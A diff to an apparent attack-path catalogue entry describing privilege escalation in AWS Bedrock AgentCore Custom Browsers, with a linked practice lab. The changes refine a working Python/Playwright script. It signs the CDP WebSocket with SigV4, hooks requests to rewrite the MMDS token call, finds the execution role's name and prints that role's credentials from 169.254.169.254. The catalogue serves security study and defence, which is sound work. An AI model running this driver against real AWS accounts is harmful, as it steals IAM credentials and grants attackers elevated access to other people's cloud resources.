@@ -3,7 +3,7 @@ name: bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAu
 category: existing-passrole
 services:
 - bedrock-agentcore
-description: A principal with `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` can access an existing AgentCore Custom Browser that has a privileged IAM execution role attached and drive it over Chrome DevTools Protocol (CDP) to read the execution role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254. This path does not require `iam:PassRole` because the role is already attached to the existing browser. The attacker presigns the automation WebSocket, connects with a CDP client such as Playwright and installs a request hook that rewrites the MMDS token request from GET to PUT and injects the token header, then navigates to the role-credentials endpoint and reads the response. The execution role is optional at browser creation, so only browsers created with a role attached are affected.
+description: A principal with `bedrock-agentcore:StartBrowserSession` and `bedrock-agentcore:ConnectBrowserAutomationStream` can access an existing AgentCore Custom Browser that has a privileged IAM execution role attached and drive it over Chrome DevTools Protocol (CDP) to read the execution role credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254. This path does not require `iam:PassRole` because the role is already attached to the existing browser. The `start-browser-session` response returns the real automation WebSocket endpoint directly, so the attacker signs the CDP connection with header-based SigV4 authentication (not a presigned query string) and connects with a CDP client such as Playwright. It then installs a request hook that rewrites the MMDS token request from GET to PUT and injects the token header, discovers the execution role's name from the MMDS security-credentials index, and navigates to that role's credentials endpoint to read the response. The execution role is optional at browser creation, so only browsers created with a role attached are affected.
 prerequisites:
   admin:
   - An AgentCore Custom Browser must exist with an IAM execution role attached
@@ -25,29 +25,30 @@ exploitationSteps:
       aws bedrock-agentcore-control get-browser --browser-id BROWSER_ID
 
       '
-    description: List existing Custom Browsers and confirm the target has a privileged execution role attached
+    description: List existing Custom Browsers and confirm the target has a privileged execution role attached and is in READY state before starting a session against it
   - step: 3
     command: |
       cat << 'EOF' > "get_creds_from_browser.py"
       import boto3, sys
-      from botocore.auth import SigV4QueryAuth
+      from urllib.parse import urlparse
+      from botocore.auth import SigV4Auth
       from botocore.awsrequest import AWSRequest
+      from botocore.credentials import Credentials
       from playwright.sync_api import sync_playwright
 
       BROWSER_ID = sys.argv[1]
       REGION = sys.argv[2]
 
       client = boto3.client("bedrock-agentcore", region_name=REGION)
-      session_id = client.start_browser_session(browserIdentifier=BROWSER_ID, sessionTimeoutSeconds=300)["sessionId"]
+      session = client.start_browser_session(browserIdentifier=BROWSER_ID, sessionTimeoutSeconds=300)
+      ws_url = session["streams"]["automationStream"]["streamEndpoint"]
 
-      creds = boto3.Session().get_credentials().get_frozen_credentials()
-      url = f"https://bedrock-agentcore.{REGION}.amazonaws.com/browser-streams/{BROWSER_ID}/sessions/{session_id}/automation"
-      request = AWSRequest(method="GET", url=url)
-      SigV4QueryAuth(creds, "bedrock-agentcore", REGION, expires=60).add_auth(request)
-      ws_url = request.url.replace("https://", "wss://")
+      creds = Credentials(*boto3.Session().get_credentials().get_frozen_credentials())
+      request = AWSRequest(method="GET", url=ws_url.replace("wss://", "https://"), headers={"host": urlparse(ws_url).hostname})
+      SigV4Auth(creds, "bedrock-agentcore", REGION).add_auth(request)
 
       with sync_playwright() as p:
-          browser = p.chromium.connect_over_cdp(ws_url)
+          browser = p.chromium.connect_over_cdp(ws_url, headers=dict(request.headers))
           page = browser.contexts[0].pages[0]
           token = {"value": ""}
 
@@ -61,10 +62,12 @@ exploitationSteps:
 
           page.goto("http://169.254.169.254/latest/api/token")
           token["value"] = page.locator("pre").text_content().strip()
-          page.goto("http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role")
+          page.goto("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+          role_name = page.locator("pre").text_content().strip()
+          page.goto(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
           print(page.locator("pre").text_content())
       EOF
-    description: Create the python file that presigns the automation WebSocket, connects over CDP and reads the execution role credentials from MMDS via a context.route hook that rewrites GET to PUT and injects the MMDSv2 token header
+    description: Create the python file that reads the CDP WebSocket endpoint from the start_browser_session response, connects over CDP using header-based SigV4 auth, discovers the execution role's name from the MMDS security-credentials index, then reads its credentials via a context.route hook that rewrites GET to PUT and injects the MMDSv2 token header
   - step: 4
     command: python3 get_creds_from_browser.py $BROWSER_ID $AWS_REGION
     description: Run the driver against the existing browser to print the execution role credentials
@@ -124,12 +127,18 @@ relatedPaths:
 - bedrock-004
 - bedrock-006
 - ec2-002
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: privesc-one-hop/to-admin/bedrockagentcore-startbrowsersession+cdp
+    description: Deploy Terraform into your own AWS account to practice this attack path
 permissions:
   required:
   - permission: bedrock-agentcore:StartBrowserSession
-    resourceConstraints: Target browser must be in the Resource section
+    resourceConstraints: Must have permission to start sessions on the target browser; can be scoped to a specific browser ARN or granted on wildcard
   - permission: bedrock-agentcore:ConnectBrowserAutomationStream
-    resourceConstraints: Target browser must be in the Resource section
+    resourceConstraints: Must have permission to connect the CDP automation stream to the target browser; can be scoped to a specific browser ARN or granted on wildcard
   additional:
   - permission: bedrock-agentcore:ListBrowsers
     resourceConstraints: List the Custom Browsers that already exist
@@ -154,7 +163,7 @@ attackVisualization:
     type: payload
     color: '#99ccff'
     description: |
-      The attacker presigns the automation WebSocket, connects a CDP client such as Playwright and installs a context.route hook that operates one layer below the page. A direct in-page request is blocked because browsers refuse cross-origin PUT requests and MMDS does not opt in, so the hook rewrites the token request from GET to PUT and injects the MMDSv2 token header on subsequent requests. The browser then navigates to the credentials endpoint and the driver reads the role credentials out of the page.
+      The `start-browser-session` response returns the real automation WebSocket endpoint directly, so the attacker signs the CDP connection with header-based SigV4 auth and connects a CDP client such as Playwright, then installs a context.route hook that operates one layer below the page. A direct in-page request is blocked because browsers refuse cross-origin PUT requests and MMDS does not opt in, so the hook rewrites the token request from GET to PUT and injects the MMDSv2 token header on subsequent requests. The driver then reads the execution role's name from the MMDS security-credentials index before navigating to that role's credentials endpoint and reading the response out of the page.
 
       Key part of the driver:
       ```python
@@ -165,7 +174,9 @@ attackVisualization:
               route.continue_(headers={"X-aws-ec2-metadata-token": token["value"]})
 
       page.context.route("http://169.254.169.254/**", rewrite)
-      page.goto("http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role")
+      page.goto("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+      role_name = page.locator("pre").text_content().strip()
+      page.goto(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
       ```
   - id: admin
     label: Effective Administrator
@@ -186,7 +197,7 @@ attackVisualization:
     to: browser
     label: Target existing Custom Browser
     description: |
-      Identify an existing Custom Browser that has a privileged execution role attached. Use the list and get control-plane calls to discover candidates and confirm their execution role.
+      Identify an existing Custom Browser that has a privileged execution role attached. Use the list and get control-plane calls to discover candidates and confirm their execution role and READY status before starting a session against one.
 
       Commands:
       ```bash
@@ -196,7 +207,7 @@ attackVisualization:
   - from: browser
     to: execution_role
     label: bedrock-agentcore:StartBrowserSession + bedrock-agentcore:ConnectBrowserAutomationStream
-    description: The attacker starts a browser session, presigns the automation WebSocket and connects a CDP driver to the existing browser. The driver has a path to the execution role credentials on MMDS inside the microVM.
+    description: The attacker starts a browser session and reads the automation WebSocket endpoint directly from the response, then connects a CDP driver to the existing browser using header-based SigV4 auth. The driver has a path to the execution role credentials on MMDS inside the microVM.
   - from: execution_role
     to: cdp_read
     label: Drive the browser over CDP to read MMDS
